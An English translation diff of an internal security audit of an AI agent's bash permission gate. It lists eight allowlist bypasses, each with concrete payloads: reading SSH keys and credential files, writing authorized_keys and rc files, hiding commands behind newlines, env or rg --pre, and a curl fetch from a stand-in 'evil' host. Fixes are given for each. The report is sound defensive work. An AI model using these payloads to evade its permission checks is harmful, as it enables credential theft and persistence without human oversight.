@@ -1,142 +1,142 @@
-# 规则层安全审计报告
+# Rule-Layer Security Audit Report
 
-审计日期：2026-08-26（首轮）／ 2026-08-26（重扫复核，仓库更名 pi-verdict、开源前窗口）
-审计对象：`extensions/auto-mode.ts` 规则层（bash 白名单 + 路径敏感度分级）
-状态：**8 项漏洞全部未修复**——重扫实测确认所有攻击载荷仍返回 `allow`
+Audit date: 2026-08-26 (first pass) / 2026-08-26 (re-scan verification, repo renamed to pi-verdict, pre-open-source window)
+Audit target: the `extensions/auto-mode.ts` rule layer (bash allowlist + path sensitivity tiers)
+Status: **all 8 vulnerabilities remain unfixed** - the re-scan confirmed by measurement that every attack payload still returns `allow`
 
-> 内部文档：含具体攻击载荷与行号定位。仓库处于公开发布前窗口（npm publish 就绪 + CI 已配置），入库前请决定是否随仓库公开。
+> Internal document: contains concrete attack payloads and line-number references. The repo is in the pre-public-release window (npm publish ready + CI configured); decide before committing whether it should be made public with the repo.
 
 ---
 
-## 审计范围与方法
+## Audit Scope and Method
 
-- 首轮：全仓库（全部非 Markdown 文件逐行 + 全部 Markdown/lock 文件密钥扫描 + git 全历史 commit message 与 `git log -p --all` 密钥模式扫描），8 项疑似漏洞经并行误报过滤子任务逐项独立复核，全部确认为真阳性（置信度 8-10/10）
-- 重扫：逐行比对当前代码与首轮版本（逐字节一致，规则层未被触及），并用 `Bun.Transpiler` 内存执行仓库真实 `classifyBash`/`classifyByRules` 对全部攻击载荷实测裁决（不实际运行系统命令）
+- First pass: whole repo (every non-Markdown file line by line + secret scan of all Markdown/lock files + secret-pattern scan of the full git history commit messages and `git log -p --all`); the 8 suspected vulnerabilities were each independently re-verified by parallel false-positive-filtering subtasks, and all were confirmed as true positives (confidence 8-10/10)
+- Re-scan: line-by-line comparison of the current code against the first-pass version (byte-identical; the rule layer was not touched), and the repo's real `classifyBash`/`classifyByRules` were executed in memory via `Bun.Transpiler` to measure the verdict for every attack payload (no system command is actually run)
 
-## 安全模型（审计前提）
+## Security Model (Audit Premises)
 
-- Pi 运行时默认 YOLO 模式，本扩展是唯一权限闸门
-- 规则层 `allow` = 零人工确认直接执行（`extensions/auto-mode.ts:586-590`），并**完全短路**第 2 层模型分类器
-- 不可信输入面 = agent 发出的 tool_call 参数（prompt injection → agent 可发任意命令）
-- 因此规则层放行绕过 = 完全突破；以下 8 项均为核心安全功能的具体失效
+- The Pi runtime defaults to YOLO mode; this extension is the only permission gate
+- Rule layer `allow` = executed directly with zero human confirmation (`extensions/auto-mode.ts:586-590`), and **fully short-circuits** the layer-2 model classifier
+- Untrusted input surface = the tool_call arguments emitted by the agent (prompt injection -> the agent can issue arbitrary commands)
+- Therefore a rule-layer allow bypass = full breach; each of the 8 items below is a concrete failure of a core security feature
 
-## 实测裁决汇总（重扫，2026-08-26）
+## Measured Verdict Summary (Re-scan, 2026-08-26)
 
-| # | 漏洞 | 实测载荷（节选） | 裁决 |
+| # | Vulnerability | Measured payload (excerpt) | Verdict |
 |---|------|-----------------|------|
-| V1 | bash 文件操作数无路径检查 | `cat ~/.ssh/id_rsa` | ALLOW |
-| V2 | `>`/`>>` 重定向目标不检查 | `echo evil-line > ~/.ssh/authorized_keys` | ALLOW |
-| V3 | 换行/`&`/`$()`/`<()` 藏命令 | `ls\nbash /tmp/evil.sh` | ALLOW |
-| V4 | `env` 前缀执行任意命令 | `env npx -y evil-pkg` | ALLOW |
-| V5 | `rg` `--pre` 检查为死代码 | `rg --pre=sh pattern` | ALLOW |
-| V6 | `OUTPUT_FLAG_COMMANDS` 短路使 `-o` 检查失效 | `sort -o ~/.bashrc payload.txt` | ALLOW |
-| V7 | git flag 精确匹配，`--output=` 绕过 | `git log --format=x --output=~/Library/LaunchAgents/x.plist` | ALLOW |
-| V8 | S0 密钥路径清单遗漏 | `read ~/.npmrc` | ALLOW |
+| V1 | bash file operands get no path check | `cat ~/.ssh/id_rsa` | ALLOW |
+| V2 | `>`/`>>` redirect targets are not checked | `echo evil-line > ~/.ssh/authorized_keys` | ALLOW |
+| V3 | newline/`&`/`$()`/`<()` hide commands | `ls\nbash /tmp/evil.sh` | ALLOW |
+| V4 | `env` prefix runs arbitrary commands | `env npx -y evil-pkg` | ALLOW |
+| V5 | `rg` `--pre` check is dead code | `rg --pre=sh pattern` | ALLOW |
+| V6 | `OUTPUT_FLAG_COMMANDS` short-circuit disables the `-o` check | `sort -o ~/.bashrc payload.txt` | ALLOW |
+| V7 | git flags matched exactly; `--output=` bypasses | `git log --format=x --output=~/Library/LaunchAgents/x.plist` | ALLOW |
+| V8 | S0 secret-path list has omissions | `read ~/.npmrc` | ALLOW |
 
-**对照组**（证明绕过真实有效）：
+**Control group** (proves the bypasses are genuinely effective):
 
-- `npm install evil-pkg` 单独 → `GRAY`（正确交分类器）；套上 `env` 或挂在白名单首词后 → `ALLOW`（V3/V4 生效性证明）
-- `read ~/.ssh/id_rsa` → `DENY`（S0 控制存在但清单不全，V8 生效性证明）
-
----
-
-## V1：bash 文件操作数无路径检查（任意敏感文件读取）
-
-- 位置：`extensions/auto-mode.ts:167`（白名单 46-53 行；`classifyPath` 193-207 行）
-- 严重级：High（置信度 9/10）
-- 描述：S0/S1 路径分级只应用于 `read/write/edit/grep/find/ls` 工具的 `path` 参数；bash 命令的文件操作数从不做任何路径检查。`cat`/`grep`/`head`/`jq`/`less` 均在无条件白名单，命中即放行。同一策略经 read 工具会被 S0 硬 deny，换 bash 的 `cat` 即绕过；S1 系统路径（如 `cat /etc/*`）同样被从 gray 降级为硬 allow。
-- 实测载荷：`cat ~/.ssh/id_rsa`、`cat ~/.aws/credentials`、`jq . ~/.pi/agent/auth.json` → 全部 ALLOW
-- 利用场景：被注入的 agent 调用 bash 执行 `cat ~/.ssh/id_rsa` → 规则层确定性放行 → 私钥/云凭证进入模型上下文，可经模型回复外传
-- 修复建议：对白名单命令的文件操作数（位置参数、`-f` 类 flag）复用 `classifyPath` 的 S0/S1 分级；或 bash 白名单命令含 `~`/绝对路径操作数时降级 gray
-
-## V2：输出重定向目标不检查（任意文件写入）
-
-- 位置：`extensions/auto-mode.ts:155-174`（危险正则中唯一重定向规则仅覆盖裸块设备，77 行）
-- 严重级：High（置信度 9/10）
-- 描述：`classifyBash` 只对每段提取命令名比对白名单，从不检查 `>`/`>>` 重定向目标。而 `classifyPath` 的 S1/S2 规则（188-189 行）明确列有 `authorized_keys`、`.bashrc/.zshrc` 等受保护路径——设计意图就是拦截这些写入，但该检查只挂在 write/edit 工具上，bash 重定向完全绕过。单条 `echo` 即可完成利用，无需 staging。
-- 实测载荷：`echo evil-line > ~/.ssh/authorized_keys`、`echo export PATH=~/bin:$PATH >> ~/.zshrc` → 全部 ALLOW
-- 利用场景：写 `authorized_keys` 获得 SSH 持久化；写 rc 文件实现下次开 shell RCE；全程零确认
-- 修复建议：解析每段重定向目标并套用写路径分级（S0/S1/S2 deny、CWD 外 gray）；无法可靠解析时整段降级 gray
-- 附注：README.md:95 自述 *"revisit if real traffic shows sensitive-path redirects slipping through"*——重定向旁路已被识别为已知风险但未修复
-
-## V3：shell 组合运算符隐藏命令（跳过分类器）
-
-- 位置：`extensions/auto-mode.ts:95`（`splitShellChain` 93-98 行；powershell 分支 212-213 行复用同一函数）
-- 严重级：High（置信度 9/10）
-- 描述：`splitShellChain` 只按 `&&`/`||`/`;`/`|` 切分；换行、单个 `&`、命令替换 `$(...)`、进程替换 `<(...)`、反引号均不在切分与检查范围内，`segmentArgv` 又只检查首词。把真实命令挂在白名单首词之后即可完全绕开分类器。README「已知限制」承认的是引号内运算符的过度切分（误报方向），与此处漏检（漏报方向）是相反的失效模式。
-- 实测载荷：`ls\nbash /tmp/evil.sh`、`cat foo & npm install evil-pkg`、`git log\nnpm install left-pad`、`echo $(bash /tmp/evil.sh)`、`cat <(npx -y evil-pkg)` → 全部 ALLOW
-- 利用场景：prompt injection 后 agent 发出 `ls\nbash /tmp/evil.sh` → 规则层放行 → 任意命令无确认执行
-- 修复建议：引入 shell AST 解析（`research/rule-engine-sim/measure.ts` 已验证 tree-sitter-bash 方案可复用）；或保守降级——命令含换行/`&`/`$(`/`<(`/反引号一律 gray
-
-## V4：`env` 前缀执行任意命令
-
-- 位置：`extensions/auto-mode.ts:52`
-- 严重级：High（置信度 9/10）
-- 描述：`env` 位于无条件安全集合，而 `env <cmd> <args>` 的语义就是执行 `<cmd>`。`segmentArgv` 只剥离 `VAR=value` 前缀，`env` 不匹配该形式，argv[0] 即 `env`，命中即放行，其后的命令永不被检查；basename 归一化使 `/usr/bin/env` 形式同样绕过。白名单注释自称"只读/无副作用命令"，与 `env` 语义矛盾。
-- 实测载荷：`env npx -y evil-pkg`、`env pip install evil` → 全部 ALLOW（裸命令本应 GRAY）
-- 利用场景：`env npx -y <恶意 npm 包>`（npx 直接下载执行）→ 任意代码执行；`env python -c`、`env node -e`、`env bash script.sh` 同理
-- 修复建议：`env` 移出无条件集合，改为条件规则——对 `env` 后续 token 递归套用白名单/条件检查
-
-## V5：`rg` 无条件放行使 `--pre` 检查成为死代码（任意命令执行）
-
-- 位置：`extensions/auto-mode.ts:51`（`RG_FORBIDDEN` 定义 65 行，不可达检查 122-123 行）
-- 严重级：High（置信度 9/10）
-- 描述：`rg` 在无条件白名单，167 行命中即 `continue`，`isConditionalSafe` 中针对 rg 的 `RG_FORBIDDEN`（`--pre` 等）是不可达死代码——作者意图拦截 `--pre`，检查顺序违背了该意图。ripgrep 的 `--pre=<cmd>` 会对每个被搜索文件执行该命令。附带缺陷：`RG_FORBIDDEN.has(t)` 为精确匹配，`--pre=<cmd>` 附带形式即使检查可达也拦不住。
-- 实测载荷：`rg --pre=sh pattern`、`rg --pre /bin/sh pattern` → 全部 ALLOW
-- 利用场景：`rg --pre='bash -c "curl http://evil/x.sh -o /tmp/x"' pattern .` → 规则层放行 → ripgrep 在每个文件上执行攻击者命令
-- 修复建议：`rg` 移入条件白名单，且 flag 检查改为前缀匹配（`t === f || t.startsWith(f + "=")`）
-- 附注：`date` 的 `-s`/`--set` 检查（132-133 行）同理为死代码，影响较低
-
-## V6：`OUTPUT_FLAG_COMMANDS` 短路使 `-o` 写文件检查失效（任意文件写入）
-
-- 位置：`extensions/auto-mode.ts:170`（集合定义 66 行；被短路的检查 124-128 行）
-- 严重级：High（置信度 10/10）
-- 描述：`if (OUTPUT_FLAG_COMMANDS.has(cmd) || isConditionalSafe(argv)) continue;` —— `sort/base64/iconv/shuf` 命中集合即直接放行，`||` 短路使 124-128 行针对这些命令的 `-o/--output` 拦截成为不可达死代码。附带缺陷：128 行检查本身也是精确匹配，`--output=<path>` 附带形式即使可达也拦不住。
-- 实测载荷：`sort -o ~/.bashrc payload.txt`、`sort --output=~/.bashrc payload.txt`、`iconv -o /tmp/x in.txt` → 全部 ALLOW
-- 利用场景：在 CWD 内写 `payload.txt`（205 行规则放行），再执行 `sort -o ~/.bashrc payload.txt` → 以完全可控内容覆盖任意路径文件（rc 文件/authorized_keys 持久化）
-- 修复建议：删除 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` 分支统一走 `isConditionalSafe`，并将 `-o` 拦截改为前缀匹配覆盖 `--output=<path>` 形态
-
-## V7：git 禁止 flag 精确匹配，`=` 附带形式绕过（任意内容写任意文件）
-
-- 位置：`extensions/auto-mode.ts:114`（集合定义 60-63 行；`log` 在 `GIT_READONLY_SUBCOMMANDS` 56-59 行）
-- 严重级：Medium（置信度 9/10）
-- 描述：`rest.some((t) => GIT_FORBIDDEN_FLAGS.has(t))` 为精确 token 相等，`--output=/path`、`--git-dir=/x`、`--work-tree=/x`、`--exec=`、`--ext-diff=`、`--textconv=` 等附带形式均不等于集合中的裸 flag。`git log --format=<字面文本> --output=<路径>` 的输出内容完全由 `--format` 字面量控制、写入任意路径（git-log 文档化行为）。
-- 实测载荷：`git log --format=x-cron-line --output=~/Library/LaunchAgents/x.plist` → ALLOW
-- 利用场景：写 `authorized_keys`/crontab/rc 文件实现零确认持久化
-- 修复建议：flag 检查改为前缀匹配（`t === f || t.startsWith(f + "=")`），或含 `--output`/`-o` 的 git 调用降级 gray
-- 附注：写入内容按 repo 内 commit 数重复（多 commit repo 下 XML plist 可能变形；authorized_keys/crontab 场景不受影响）
-
-## V8：S0 密钥路径清单遗漏常见凭证文件
-
-- 位置：`extensions/auto-mode.ts:184-187`（read 分支 218-226 行）
-- 严重级：Medium（置信度 8/10）
-- 描述：S0_SECRET 意图覆盖凭证文件（已含 `.ssh/`、`.aws/`、`.gnupg/`、`.env*`、`id_rsa`、`*.pem`、`credentials`、gh CLI 配置），但遗漏 `~/.netrc`、`~/.npmrc`、`~/.pypirc`、`~/.kube/config`、`~/.docker/config.json`、`.envrc` 等标准明文凭证文件——控制自身的具体不一致，而非泛化加固缺失。grep/find/ls 共用同一读分支，泄露面不限于 read 工具；V1 的 `cat` 旁路使该清单的 bash 侧完全失效。
-- 实测载荷：`read ~/.npmrc`、`~/.netrc`、`~/.kube/config`、`~/.docker/config.json` → 全部 ALLOW
-- 利用场景：读 `~/.npmrc`（registry `_authToken`）或 `~/.netrc`（明文密码）→ 凭证进入模型上下文并外传
-- 修复建议：扩充 S0 至 `\.netrc$`、`\.npmrc$`、`\.pypirc$`、`\.kube(/|$)`、`\.docker/config\.json$`、`\.vault-token`、`\.gem/credentials`、`\.envrc`；路径检查建议基于 `realpath`（现行字符串正则不解析符号链接）
+- `npm install evil-pkg` alone -> `GRAY` (correctly handed to the classifier); wrapped in `env` or attached after an allowlisted first word -> `ALLOW` (proves V3/V4 are effective)
+- `read ~/.ssh/id_rsa` -> `DENY` (the S0 control exists but its list is incomplete; proves V8 is effective)
 
 ---
 
-## 已排除区域（未发现漏洞）
+## V1: bash file operands get no path check (arbitrary sensitive-file read)
 
-- git 历史/commit message：全历史密钥模式扫描零命中（含开源前敏感信息脱敏提交 `93a66d7`）
-- `research/cache-sim/fetch-io.ts`：仅向环境变量提供的 Langfuse 地址发请求，响应只经 `JSON.parse` 分析、从不 eval；凭证全部取自环境变量
-- `research/rule-engine-sim/measure.ts`：`new Function` 仅执行本仓库自身源码切片（可信输入）
-- `--auto-mode-debug` 日志：仅记录命令行/路径，不记录密钥
+- Location: `extensions/auto-mode.ts:167` (allowlist lines 46-53; `classifyPath` lines 193-207)
+- Severity: High (confidence 9/10)
+- Description: S0/S1 path tiering is applied only to the `path` argument of the `read/write/edit/grep/find/ls` tools; bash file operands are never path-checked. `cat`/`grep`/`head`/`jq`/`less` are all on the unconditional allowlist and are allowed on first-word match. The same target that the read tool hard-denies via S0 is bypassed by using bash `cat`; S1 system paths (e.g. `cat /etc/*`) are likewise downgraded from gray to a hard allow.
+- Measured payloads: `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `jq . ~/.pi/agent/auth.json` -> all ALLOW
+- Exploit scenario: an injected agent calls bash to run `cat ~/.ssh/id_rsa` -> the rule layer deterministically allows it -> the private key / cloud credentials enter the model context and can be exfiltrated via the model's reply
+- Fix suggestion: reuse the `classifyPath` S0/S1 tiering for file operands of allowlisted commands (positional arguments, `-f`-style flags); or downgrade to gray when an allowlisted bash command has a `~`/absolute-path operand
 
-## 共同根因与修复优先级
+## V2: output redirect targets are not checked (arbitrary file write)
 
-根因：白名单层「只看段首词 + 无 shell AST + 无文件操作数/重定向目标检查 + flag 精确匹配」。
+- Location: `extensions/auto-mode.ts:155-174` (the only redirect rule among the dangerous regexes covers just bare block devices, line 77)
+- Severity: High (confidence 9/10)
+- Description: `classifyBash` only compares the extracted command name of each segment against the allowlist and never checks `>`/`>>` redirect targets. Meanwhile the S1/S2 rules of `classifyPath` (lines 188-189) explicitly list protected paths such as `authorized_keys` and `.bashrc/.zshrc` - the design intent is to block these writes, but that check is attached only to the write/edit tools, so bash redirects bypass it entirely. A single `echo` completes the exploit, with no staging.
+- Measured payloads: `echo evil-line > ~/.ssh/authorized_keys`, `echo export PATH=~/bin:$PATH >> ~/.zshrc` -> all ALLOW
+- Exploit scenario: write `authorized_keys` for SSH persistence; write rc files for RCE on the next shell start; zero confirmations throughout
+- Fix suggestion: parse each segment's redirect targets and apply write-path tiering (S0/S1/S2 deny, gray outside CWD); when parsing cannot be done reliably, downgrade the whole segment to gray
+- Note: README.md:95 states *"revisit if real traffic shows sensitive-path redirects slipping through"* - the redirect bypass was already identified as a known risk but not fixed
 
-修复优先级：**V3/V4/V5（直接 RCE）→ V1/V2（凭证窃取/持久化）→ V6/V7 → V8**。
+## V3: shell compound operators hide commands (skip the classifier)
 
-低成本快速修复（发布前窗口建议）：
+- Location: `extensions/auto-mode.ts:95` (`splitShellChain` lines 93-98; the powershell branch at lines 212-213 reuses the same function)
+- Severity: High (confidence 9/10)
+- Description: `splitShellChain` splits only on `&&`/`||`/`;`/`|`; newlines, a single `&`, command substitution `$(...)`, process substitution `<(...)`, and backticks are neither split nor inspected, and `segmentArgv` only checks the first word. Attaching a real command after an allowlisted first word completely bypasses the classifier. The README "Known limitations" admits over-splitting of operators inside quotes (the false-positive direction), which is the opposite failure mode from this missed detection (the false-negative direction).
+- Measured payloads: `ls\nbash /tmp/evil.sh`, `cat foo & npm install evil-pkg`, `git log\nnpm install left-pad`, `echo $(bash /tmp/evil.sh)`, `cat <(npx -y evil-pkg)` -> all ALLOW
+- Exploit scenario: after prompt injection the agent issues `ls\nbash /tmp/evil.sh` -> the rule layer allows it -> arbitrary commands run without confirmation
+- Fix suggestion: introduce shell AST parsing (`research/rule-engine-sim/measure.ts` has already verified that the tree-sitter-bash approach is reusable); or conservatively downgrade - any command containing a newline/`&`/`$(`/`<(`/backtick is gray
 
-1. V4：`env` 移出 `BASH_SAFE_UNCONDITIONAL`（一行）
-2. V5：`rg` 移入 `isConditionalSafe` 条件分支 + 前缀匹配（数行）
-3. V6：删除 170 行 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` 短路（一行）+ 128 行改前缀匹配
-4. V7：114 行改前缀匹配（一行）
-5. V3：保守降级——命令含换行/`&`/`$(`/`<(`/反引号一律 gray（数行）
-6. V8：扩充 S0 正则清单（数行）
+## V4: `env` prefix runs arbitrary commands
 
-统一架构修复（中期）：tree-sitter-bash AST 解析 + 重定向目标/文件操作数提取 + `classifyPath` 统一分级——V1/V2/V3/V5/V6/V7 一次性解决（`research/rule-engine-sim/measure.ts` 已验证可行性；此前因收益测量结论暂缓，见 `research/rule-engine-sim/README.md`，安全审计结论支持重新评估该决议）。
+- Location: `extensions/auto-mode.ts:52`
+- Severity: High (confidence 9/10)
+- Description: `env` is in the unconditional safe set, yet the semantics of `env <cmd> <args>` is to execute `<cmd>`. `segmentArgv` only strips `VAR=value` prefixes; `env` does not match that form, so argv[0] is `env`, it is allowed on match, and the command after it is never checked; basename normalization lets the `/usr/bin/env` form bypass as well. The allowlist comment claims "read-only / side-effect-free commands", which contradicts the semantics of `env`.
+- Measured payloads: `env npx -y evil-pkg`, `env pip install evil` -> all ALLOW (the bare commands should be GRAY)
+- Exploit scenario: `env npx -y <malicious npm package>` (npx downloads and executes directly) -> arbitrary code execution; `env python -c`, `env node -e`, `env bash script.sh` likewise
+- Fix suggestion: move `env` out of the unconditional set and make it a conditional rule - recursively apply the allowlist/conditional checks to the tokens following `env`
+
+## V5: unconditional `rg` allow makes the `--pre` check dead code (arbitrary command execution)
+
+- Location: `extensions/auto-mode.ts:51` (`RG_FORBIDDEN` defined at line 65, unreachable check at lines 122-123)
+- Severity: High (confidence 9/10)
+- Description: `rg` is on the unconditional allowlist and hits `continue` at line 167, so the rg-specific `RG_FORBIDDEN` (`--pre`, etc.) in `isConditionalSafe` is unreachable dead code - the author intended to block `--pre`, but the check order defeats that intent. ripgrep's `--pre=<cmd>` runs that command for every searched file. Additional defect: `RG_FORBIDDEN.has(t)` is an exact match, so the attached form `--pre=<cmd>` would not be caught even if the check were reachable.
+- Measured payloads: `rg --pre=sh pattern`, `rg --pre /bin/sh pattern` -> all ALLOW
+- Exploit scenario: `rg --pre='bash -c "curl http://evil/x.sh -o /tmp/x"' pattern .` -> the rule layer allows it -> ripgrep runs the attacker's command on every file
+- Fix suggestion: move `rg` into the conditional allowlist and change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`)
+- Note: the `-s`/`--set` check for `date` (lines 132-133) is likewise dead code, with lower impact
+
+## V6: `OUTPUT_FLAG_COMMANDS` short-circuit disables the `-o` file-write check (arbitrary file write)
+
+- Location: `extensions/auto-mode.ts:170` (set defined at line 66; short-circuited check at lines 124-128)
+- Severity: High (confidence 10/10)
+- Description: `if (OUTPUT_FLAG_COMMANDS.has(cmd) || isConditionalSafe(argv)) continue;` - `sort/base64/iconv/shuf` are allowed immediately on hitting the set, and the `||` short-circuit makes the `-o/--output` blocking at lines 124-128 for these commands unreachable dead code. Additional defect: the check at line 128 is itself an exact match, so the attached form `--output=<path>` would not be caught even if it were reachable.
+- Measured payloads: `sort -o ~/.bashrc payload.txt`, `sort --output=~/.bashrc payload.txt`, `iconv -o /tmp/x in.txt` -> all ALLOW
+- Exploit scenario: write `payload.txt` inside CWD (allowed by the rule at line 205), then run `sort -o ~/.bashrc payload.txt` -> overwrites a file at any path with fully controlled content (rc file / authorized_keys persistence)
+- Fix suggestion: delete the `OUTPUT_FLAG_COMMANDS.has(cmd) ||` branch so everything goes through `isConditionalSafe`, and change the `-o` blocking to prefix matching so it covers the `--output=<path>` form
+
+## V7: git forbidden flags matched exactly; the `=` attached form bypasses (arbitrary content to arbitrary file)
+
+- Location: `extensions/auto-mode.ts:114` (set defined at lines 60-63; `log` is in `GIT_READONLY_SUBCOMMANDS` at lines 56-59)
+- Severity: Medium (confidence 9/10)
+- Description: `rest.some((t) => GIT_FORBIDDEN_FLAGS.has(t))` is exact token equality, so attached forms such as `--output=/path`, `--git-dir=/x`, `--work-tree=/x`, `--exec=`, `--ext-diff=`, `--textconv=` never equal the bare flags in the set. For `git log --format=<literal text> --output=<path>`, the output content is fully controlled by the `--format` literal and is written to an arbitrary path (documented git-log behavior).
+- Measured payload: `git log --format=x-cron-line --output=~/Library/LaunchAgents/x.plist` -> ALLOW
+- Exploit scenario: write `authorized_keys`/crontab/rc files for zero-confirmation persistence
+- Fix suggestion: change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`), or downgrade git invocations containing `--output`/`-o` to gray
+- Note: the written content is repeated once per commit in the repo (an XML plist may be malformed in repos with many commits; the authorized_keys/crontab scenarios are unaffected)
+
+## V8: S0 secret-path list omits common credential files
+
+- Location: `extensions/auto-mode.ts:184-187` (read branch lines 218-226)
+- Severity: Medium (confidence 8/10)
+- Description: S0_SECRET is meant to cover credential files (it already includes `.ssh/`, `.aws/`, `.gnupg/`, `.env*`, `id_rsa`, `*.pem`, `credentials`, the gh CLI config), but it omits standard plaintext credential files such as `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.kube/config`, `~/.docker/config.json`, `.envrc` - a concrete inconsistency in the control itself, not a lack of generalized hardening. grep/find/ls share the same read branch, so the leak surface is not limited to the read tool; the V1 `cat` bypass makes this list completely ineffective on the bash side.
+- Measured payloads: `read ~/.npmrc`, `~/.netrc`, `~/.kube/config`, `~/.docker/config.json` -> all ALLOW
+- Exploit scenario: read `~/.npmrc` (registry `_authToken`) or `~/.netrc` (plaintext passwords) -> credentials enter the model context and are exfiltrated
+- Fix suggestion: extend S0 with `\.netrc$`, `\.npmrc$`, `\.pypirc$`, `\.kube(/|$)`, `\.docker/config\.json$`, `\.vault-token`, `\.gem/credentials`, `\.envrc`; path checks should be based on `realpath` (the current string regexes do not resolve symlinks)
+
+---
+
+## Excluded Areas (no vulnerabilities found)
+
+- git history/commit messages: secret-pattern scan of the full history had zero hits (including the pre-open-source sensitive-information redaction commit `93a66d7`)
+- `research/cache-sim/fetch-io.ts`: only sends requests to the Langfuse address supplied via environment variable; responses are only analyzed via `JSON.parse` and never eval'd; all credentials come from environment variables
+- `research/rule-engine-sim/measure.ts`: `new Function` only executes slices of this repo's own source (trusted input)
+- `--auto-mode-debug` log: records only command lines/paths, not secrets
+
+## Common Root Cause and Fix Priority
+
+Root cause: the allowlist layer "only looks at the first word of a segment + no shell AST + no file-operand/redirect-target checks + exact flag matching".
+
+Fix priority: **V3/V4/V5 (direct RCE) -> V1/V2 (credential theft/persistence) -> V6/V7 -> V8**.
+
+Low-cost quick fixes (recommended for the pre-release window):
+
+1. V4: move `env` out of `BASH_SAFE_UNCONDITIONAL` (one line)
+2. V5: move `rg` into the `isConditionalSafe` conditional branch + prefix matching (a few lines)
+3. V6: delete the line-170 `OUTPUT_FLAG_COMMANDS.has(cmd) ||` short-circuit (one line) + change the line-128 check to prefix matching
+4. V7: change line 114 to prefix matching (one line)
+5. V3: conservative downgrade - any command containing a newline/`&`/`$(`/`<(`/backtick is gray (a few lines)
+6. V8: extend the S0 regex list (a few lines)
+
+Unified architectural fix (mid-term): tree-sitter-bash AST parsing + redirect-target/file-operand extraction + unified `classifyPath` tiering - resolves V1/V2/V3/V5/V6/V7 in one go (`research/rule-engine-sim/measure.ts` has verified feasibility; it was previously deferred based on the benefit-measurement conclusion, see `research/rule-engine-sim/README.md`; the security audit findings support re-evaluating that decision).
